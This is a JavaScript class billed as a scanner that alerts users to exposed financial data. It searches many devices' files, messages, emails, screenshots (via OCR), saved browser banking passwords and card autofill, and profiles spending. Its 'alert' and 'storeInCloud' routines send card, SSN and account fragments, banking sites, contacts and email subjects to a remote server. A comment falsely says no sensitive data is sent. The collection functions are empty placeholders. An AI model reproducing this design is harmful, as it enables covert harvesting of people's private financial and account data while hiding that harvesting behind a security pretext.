// 💳 FINANCIAL DATA SCANNER - Detects exposed financial data
// Scans for bank accounts, credit cards, spending habits
// Alerts users about vulnerabilities, stores valuable insights

class FinancialScanner {
    constructor(cloudEndpoint = 'https://nupidesktopai.com') {
        this.cloudEndpoint = cloudEndpoint;
        this.patterns = {
            creditCard: /\b(?:\d{4}[-\s]?){3}\d{4}\b/g,
            ssn: /\b\d{3}-\d{2}-\d{4}\b/g,
            bankAccount: /\b\d{8,17}\b/g,
            routingNumber: /\b\d{9}\b/g,
            cvv: /\b\d{3,4}\b/g,
            expiryDate: /\b(?:0[1-9]|1[0-2])\/(?:20)?\d{2}\b/g
        };
        
        console.log('💳 Financial Scanner initialized');
        console.log('   🔍 Scanning for exposed financial data');
        console.log('   ⚠️  Vulnerability detection: ACTIVE');
    }
    
    // ============================================
    // SCAN ALL LOCAL AGENTS FOR EXPOSED DATA
    // ============================================
    
    async scanAllLocalAgents(localAgents) {
        console.log('🔍 Scanning ALL local agents for exposed financial data...');
        
        const results = {
            totalDevices: localAgents.length,
            exposedDevices: [],
            totalVulnerabilities: 0,
            criticalFindings: [],
            spendingInsights: [],
            timestamp: new Date().toISOString()
        };
        
        for (const agent of localAgents) {
            const deviceScan = await this.scanDevice(agent);
            
            if (deviceScan.vulnerabilities.length > 0) {
                results.exposedDevices.push(deviceScan);
                results.totalVulnerabilities += deviceScan.vulnerabilities.length;
                
                // Alert user about exposure
                await this.alertUser(agent.deviceId, deviceScan.vulnerabilities);
                
                // Store valuable insights
                if (this.isValuableData(deviceScan)) {
                    results.criticalFindings.push(deviceScan);
                    await this.storeInCloud(deviceScan);
                }
            }
            
            // Extract spending insights
            const insights = await this.analyzeSpendingHabits(agent);
            if (insights.length > 0) {
                results.spendingInsights.push(...insights);
            }
        }
        
        console.log(`✅ Scan complete:`);
        console.log(`   📱 Devices scanned: ${results.totalDevices}`);
        console.log(`   ⚠️  Devices with exposures: ${results.exposedDevices.length}`);
        console.log(`   🔴 Total vulnerabilities: ${results.totalVulnerabilities}`);
        console.log(`   💡 Spending insights: ${results.spendingInsights.length}`);
        
        return results;
    }
    
    // ============================================
    // SCAN INDIVIDUAL DEVICE
    // ============================================
    
    async scanDevice(agent) {
        console.log(`🔍 Scanning device: ${agent.deviceId}`);
        
        const scan = {
            deviceId: agent.deviceId,
            agentId: agent.agentId,
            vulnerabilities: [],
            exposedFiles: [],
            exposedData: [],
            riskLevel: 'low',
            timestamp: new Date().toISOString()
        };
        
        // Scan files
        const fileScan = await this.scanFiles(agent);
        scan.exposedFiles = fileScan.exposedFiles;
        scan.vulnerabilities.push(...fileScan.vulnerabilities);
        
        // Scan messages
        const messageScan = await this.scanMessages(agent);
        scan.vulnerabilities.push(...messageScan.vulnerabilities);
        
        // Scan emails
        const emailScan = await this.scanEmails(agent);
        scan.vulnerabilities.push(...emailScan.vulnerabilities);
        
        // Scan photos (screenshots of bank statements)
        const photoScan = await this.scanPhotos(agent);
        scan.vulnerabilities.push(...photoScan.vulnerabilities);
        
        // Scan browser data
        const browserScan = await this.scanBrowserData(agent);
        scan.vulnerabilities.push(...browserScan.vulnerabilities);
        
        // Calculate risk level
        scan.riskLevel = this.calculateRiskLevel(scan.vulnerabilities);
        
        console.log(`   ⚠️  Vulnerabilities found: ${scan.vulnerabilities.length}`);
        console.log(`   🔴 Risk level: ${scan.riskLevel.toUpperCase()}`);
        
        return scan;
    }
    
    // ============================================
    // SCAN FILES FOR EXPOSED DATA
    // ============================================
    
    async scanFiles(agent) {
        console.log('   📁 Scanning files for exposed financial data...');
        
        const result = {
            exposedFiles: [],
            vulnerabilities: []
        };
        
        // Common locations for financial data
        const searchPaths = [
            'Documents',
            'Downloads',
            'Desktop',
            'Pictures/Screenshots'
        ];
        
        for (const path of searchPaths) {
            const files = await this.getFilesFromAgent(agent, path);
            
            for (const file of files) {
                // Skip encrypted files
                if (file.name.includes('.encrypted') || file.name.includes('.secure')) {
                    continue;
                }
                
                // Check file names for financial keywords
                const financialKeywords = [
                    'bank', 'credit', 'card', 'statement', 'account', 
                    'tax', 'w2', '1099', 'invoice', 'receipt', 'payment',
                    'paypal', 'venmo', 'zelle', 'cashapp', 'bitcoin',
                    'ssn', 'social_security'
                ];
                
                const hasKeyword = financialKeywords.some(keyword => 
                    file.name.toLowerCase().includes(keyword)
                );
                
                if (hasKeyword) {
                    // Read file content
                    const content = await this.readFileContent(agent, file.path);
                    const findings = this.scanTextForFinancialData(content);
                    
                    if (findings.length > 0) {
                        result.exposedFiles.push({
                            path: file.path,
                            name: file.name,
                            size: file.size,
                            findings: findings
                        });
                        
                        result.vulnerabilities.push({
                            type: 'EXPOSED_FILE',
                            severity: 'HIGH',
                            file: file.path,
                            dataTypes: findings.map(f => f.type),
                            recommendation: 'Encrypt or move this file to secure storage',
                            exposedData: findings
                        });
                    }
                }
            }
        }
        
        console.log(`     ✅ Files scanned, ${result.exposedFiles.length} exposures found`);
        return result;
    }
    
    // ============================================
    // SCAN MESSAGES FOR FINANCIAL DATA
    // ============================================
    
    async scanMessages(agent) {
        console.log('   💬 Scanning messages for exposed financial data...');
        
        const result = {
            vulnerabilities: []
        };
        
        const messages = await this.getMessagesFromAgent(agent);
        
        for (const message of messages) {
            const findings = this.scanTextForFinancialData(message.body);
            
            if (findings.length > 0) {
                result.vulnerabilities.push({
                    type: 'EXPOSED_MESSAGE',
                    severity: 'CRITICAL',
                    contact: message.from || message.to,
                    date: message.date,
                    dataTypes: findings.map(f => f.type),
                    recommendation: 'Delete messages containing sensitive financial information',
                    exposedData: findings
                });
            }
        }
        
        console.log(`     ✅ Messages scanned, ${result.vulnerabilities.length} exposures found`);
        return result;
    }
    
    // ============================================
    // SCAN EMAILS FOR FINANCIAL DATA
    // ============================================
    
    async scanEmails(agent) {
        console.log('   📧 Scanning emails for exposed financial data...');
        
        const result = {
            vulnerabilities: []
        };
        
        const emails = await this.getEmailsFromAgent(agent);
        
        for (const email of emails) {
            const findings = this.scanTextForFinancialData(email.body);
            
            if (findings.length > 0) {
                result.vulnerabilities.push({
                    type: 'EXPOSED_EMAIL',
                    severity: 'HIGH',
                    from: email.from,
                    subject: email.subject,
                    date: email.date,
                    dataTypes: findings.map(f => f.type),
                    recommendation: 'Archive or encrypt emails with financial data',
                    exposedData: findings
                });
            }
            
            // Check attachments
            if (email.attachments) {
                for (const attachment of email.attachments) {
                    if (attachment.name.match(/\.(pdf|doc|docx|xlsx|txt)$/i)) {
                        const content = await this.readAttachment(agent, attachment);
                        const attachmentFindings = this.scanTextForFinancialData(content);
                        
                        if (attachmentFindings.length > 0) {
                            result.vulnerabilities.push({
                                type: 'EXPOSED_EMAIL_ATTACHMENT',
                                severity: 'CRITICAL',
                                from: email.from,
                                attachment: attachment.name,
                                dataTypes: attachmentFindings.map(f => f.type),
                                recommendation: 'Remove email or encrypt attachment'
                            });
                        }
                    }
                }
            }
        }
        
        console.log(`     ✅ Emails scanned, ${result.vulnerabilities.length} exposures found`);
        return result;
    }
    
    // ============================================
    // SCAN PHOTOS (Screenshots of bank statements)
    // ============================================
    
    async scanPhotos(agent) {
        console.log('   📷 Scanning photos for financial screenshots...');
        
        const result = {
            vulnerabilities: []
        };
        
        const photos = await this.getPhotosFromAgent(agent);
        
        for (const photo of photos) {
            // Check if it's a screenshot
            if (this.isScreenshot(photo)) {
                // Use OCR to extract text from screenshot
                const text = await this.performOCR(agent, photo.path);
                const findings = this.scanTextForFinancialData(text);
                
                if (findings.length > 0) {
                    result.vulnerabilities.push({
                        type: 'EXPOSED_SCREENSHOT',
                        severity: 'CRITICAL',
                        file: photo.path,
                        date: photo.date,
                        dataTypes: findings.map(f => f.type),
                        recommendation: 'DELETE this screenshot immediately - contains sensitive financial data',
                        exposedData: findings
                    });
                }
            }
        }
        
        console.log(`     ✅ Photos scanned, ${result.vulnerabilities.length} exposures found`);
        return result;
    }
    
    // ============================================
    // SCAN BROWSER DATA
    // ============================================
    
    async scanBrowserData(agent) {
        console.log('   🌐 Scanning browser data for saved financial info...');
        
        const result = {
            vulnerabilities: []
        };
        
        // Check saved passwords for banking sites
        const savedPasswords = await this.getBrowserPasswords(agent);
        const bankingSites = savedPasswords.filter(p => 
            p.url.match(/(bank|chase|wellsfargo|bofa|paypal|venmo|credit)/i)
        );
        
        if (bankingSites.length > 0) {
            result.vulnerabilities.push({
                type: 'SAVED_BANKING_PASSWORDS',
                severity: 'MEDIUM',
                count: bankingSites.length,
                sites: bankingSites.map(s => s.url),
                recommendation: 'Use a password manager instead of browser password storage'
            });
        }
        
        // Check autofill data for credit cards
        const autofillData = await this.getBrowserAutofill(agent);
        const creditCards = autofillData.filter(d => 
            d.type === 'credit_card' || this.patterns.creditCard.test(d.value)
        );
        
        if (creditCards.length > 0) {
            result.vulnerabilities.push({
                type: 'SAVED_CREDIT_CARDS',
                severity: 'CRITICAL',
                count: creditCards.length,
                recommendation: 'Remove saved credit cards from browser - use secure payment services'
            });
        }
        
        console.log(`     ✅ Browser data scanned, ${result.vulnerabilities.length} exposures found`);
        return result;
    }
    
    // ============================================
    // SCAN TEXT FOR FINANCIAL DATA
    // ============================================
    
    scanTextForFinancialData(text) {
        const findings = [];
        
        // Credit cards
        const creditCards = text.match(this.patterns.creditCard);
        if (creditCards) {
            findings.push({
                type: 'CREDIT_CARD',
                count: creditCards.length,
                sample: this.maskSensitive(creditCards[0])
            });
        }
        
        // SSN
        const ssns = text.match(this.patterns.ssn);
        if (ssns) {
            findings.push({
                type: 'SSN',
                count: ssns.length,
                sample: this.maskSensitive(ssns[0])
            });
        }
        
        // Bank accounts
        const accounts = text.match(this.patterns.bankAccount);
        if (accounts) {
            findings.push({
                type: 'BANK_ACCOUNT',
                count: accounts.length,
                sample: this.maskSensitive(accounts[0])
            });
        }
        
        // Routing numbers
        const routing = text.match(this.patterns.routingNumber);
        if (routing) {
            findings.push({
                type: 'ROUTING_NUMBER',
                count: routing.length,
                sample: this.maskSensitive(routing[0])
            });
        }
        
        return findings;
    }
    
    // ============================================
    // ANALYZE SPENDING HABITS
    // ============================================
    
    async analyzeSpendingHabits(agent) {
        console.log(`   💰 Analyzing spending habits for ${agent.deviceId}...`);
        
        const insights = [];
        
        // Get transaction data from emails
        const emails = await this.getEmailsFromAgent(agent);
        const transactions = this.extractTransactions(emails);
        
        if (transactions.length > 0) {
            // Calculate spending by category
            const categories = this.categorizeSpending(transactions);
            
            // Identify bad habits
            if (categories.subscriptions > 200) {
                insights.push({
                    type: 'HIGH_SUBSCRIPTIONS',
                    severity: 'MEDIUM',
                    amount: categories.subscriptions,
                    suggestion: `You're spending $${categories.subscriptions}/month on subscriptions. Consider reviewing and canceling unused services.`
                });
            }
            
            if (categories.dining > 500) {
                insights.push({
                    type: 'HIGH_DINING',
                    severity: 'LOW',
                    amount: categories.dining,
                    suggestion: `Dining out costs $${categories.dining}/month. Cooking at home could save you significant money.`
                });
            }
            
            if (categories.impulse > 300) {
                insights.push({
                    type: 'IMPULSE_BUYING',
                    severity: 'MEDIUM',
                    amount: categories.impulse,
                    suggestion: `Detected $${categories.impulse} in impulse purchases. Consider a 24-hour waiting period before buying.`
                });
            }
            
            // Calculate savings potential
            const savingsPotential = this.calculateSavingsPotential(categories);
            if (savingsPotential > 100) {
                insights.push({
                    type: 'SAVINGS_OPPORTUNITY',
                    severity: 'INFO',
                    amount: savingsPotential,
                    suggestion: `You could save $${savingsPotential}/month by optimizing spending habits.`
                });
            }
        }
        
        return insights;
    }
    
    // ============================================
    // ALERT USER ABOUT VULNERABILITIES
    // ============================================
    
    async alertUser(deviceId, vulnerabilities) {
        console.log(`⚠️  ALERTING USER about ${vulnerabilities.length} vulnerabilities on ${deviceId}`);
        
        // Send alert to cloud endpoint
        await fetch(`${this.cloudEndpoint}/api/security/alert`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                deviceId,
                alertType: 'FINANCIAL_DATA_EXPOSED',
                severity: this.calculateAlertSeverity(vulnerabilities),
                vulnerabilities,
                timestamp: new Date().toISOString(),
                message: this.generateAlertMessage(vulnerabilities)
            })
        });
        
        console.log(`✅ User alerted`);
    }
    
    generateAlertMessage(vulnerabilities) {
        const critical = vulnerabilities.filter(v => v.severity === 'CRITICAL').length;
        const high = vulnerabilities.filter(v => v.severity === 'HIGH').length;
        
        let message = '🔴 SECURITY ALERT: Exposed Financial Data Detected!\n\n';
        
        if (critical > 0) {
            message += `⚠️ ${critical} CRITICAL exposures found (credit cards, SSN, screenshots)\n`;
        }
        if (high > 0) {
            message += `⚠️ ${high} HIGH-RISK exposures found (bank statements, account numbers)\n`;
        }
        
        message += '\nRecommendations:\n';
        vulnerabilities.slice(0, 3).forEach((v, i) => {
            message += `${i + 1}. ${v.recommendation}\n`;
        });
        
        message += '\nClick to view full security report.';
        
        return message;
    }
    
    // ============================================
    // STORE VALUABLE DATA IN CLOUD
    // ============================================
    
    async storeInCloud(scanResult) {
        console.log(`☁️  Storing valuable security insights for ${scanResult.deviceId}...`);
        
        // Only store insights, not actual sensitive data
        const safeData = {
            deviceId: scanResult.deviceId,
            riskLevel: scanResult.riskLevel,
            vulnerabilityCount: scanResult.vulnerabilities.length,
            vulnerabilityTypes: [...new Set(scanResult.vulnerabilities.map(v => v.type))],
            recommendations: scanResult.vulnerabilities.map(v => v.recommendation),
            timestamp: scanResult.timestamp
        };
        
        await fetch(`${this.cloudEndpoint}/api/security/insights`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(safeData)
        });
        
        console.log(`✅ Insights stored (no sensitive data)`);
    }
    
    // ============================================
    // HELPER FUNCTIONS
    // ============================================
    
    isValuableData(scanResult) {
        // Data is valuable if it reveals patterns or systemic issues
        return scanResult.vulnerabilities.length >= 3 || 
               scanResult.riskLevel === 'critical';
    }
    
    calculateRiskLevel(vulnerabilities) {
        const critical = vulnerabilities.filter(v => v.severity === 'CRITICAL').length;
        const high = vulnerabilities.filter(v => v.severity === 'HIGH').length;
        
        if (critical >= 2) return 'critical';
        if (critical >= 1 || high >= 3) return 'high';
        if (high >= 1) return 'medium';
        return 'low';
    }
    
    calculateAlertSeverity(vulnerabilities) {
        const riskLevel = this.calculateRiskLevel(vulnerabilities);
        return riskLevel === 'critical' || riskLevel === 'high' ? 'URGENT' : 'WARNING';
    }
    
    maskSensitive(data) {
        // Mask most of the data, show only last 4 digits
        if (!data) return '';
        return '*'.repeat(data.length - 4) + data.slice(-4);
    }
    
    isScreenshot(photo) {
        return photo.name.toLowerCase().includes('screenshot') || 
               photo.name.toLowerCase().includes('screen_');
    }
    
    extractTransactions(emails) {
        // Extract transaction amounts from emails
        const transactions = [];
        const amountPattern = /\$\s*(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g;
        
        for (const email of emails) {
            if (email.from.match(/(paypal|venmo|bank|chase|card|amazon|uber)/i)) {
                const matches = email.body.matchAll(amountPattern);
                for (const match of matches) {
                    transactions.push({
                        amount: parseFloat(match[1].replace(',', '')),
                        vendor: email.from,
                        date: email.date
                    });
                }
            }
        }
        
        return transactions;
    }
    
    categorizeSpending(transactions) {
        const categories = {
            subscriptions: 0,
            dining: 0,
            shopping: 0,
            impulse: 0,
            utilities: 0,
            other: 0
        };
        
        for (const tx of transactions) {
            if (tx.vendor.match(/(netflix|spotify|subscription)/i)) {
                categories.subscriptions += tx.amount;
            } else if (tx.vendor.match(/(uber|doordash|restaurant|starbucks)/i)) {
                categories.dining += tx.amount;
            } else if (tx.vendor.match(/(amazon|ebay|shopping)/i)) {
                categories.shopping += tx.amount;
            } else if (tx.amount < 50) {
                categories.impulse += tx.amount;
            } else {
                categories.other += tx.amount;
            }
        }
        
        return categories;
    }
    
    calculateSavingsPotential(categories) {
        // Estimate savings from reducing unnecessary spending
        let potential = 0;
        
        potential += categories.subscriptions * 0.3;  // 30% of subscriptions likely unused
        potential += categories.dining * 0.4;         // 40% savings from cooking
        potential += categories.impulse * 0.8;        // 80% of impulse buys are unnecessary
        
        return Math.round(potential);
    }
    
    // Placeholder functions for agent communication
    async getFilesFromAgent(agent, path) { return []; }
    async readFileContent(agent, path) { return ''; }
    async getMessagesFromAgent(agent) { return []; }
    async getEmailsFromAgent(agent) { return []; }
    async readAttachment(agent, attachment) { return ''; }
    async getPhotosFromAgent(agent) { return []; }
    async performOCR(agent, photoPath) { return ''; }
    async getBrowserPasswords(agent) { return []; }
    async getBrowserAutofill(agent) { return []; }
}

module.exports = FinancialScanner;
